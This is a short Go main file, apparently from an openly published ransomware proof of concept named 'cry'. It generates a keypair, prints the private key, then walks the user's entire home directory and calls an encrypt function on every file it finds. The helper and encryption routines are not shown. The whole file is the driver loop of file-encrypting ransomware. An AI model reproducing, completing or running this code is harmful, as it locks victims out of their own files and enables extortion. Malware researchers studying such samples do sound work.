package main

import (
	"fmt"

	"os"

	"github.com/redpois0n/cry/common"
)

func main() {
	fmt.Println("generating keypair...")
	priv := common.Generate()

	fmt.Println()
	fmt.Println(common.Stringify(priv))

	startWalk := common.GetHomeDir()

	common.Walk(startWalk, func(filePath string, fileInfo os.FileInfo) {
		fmt.Println("encrypting", filePath)

		encrypt(filePath, priv)
	})
}
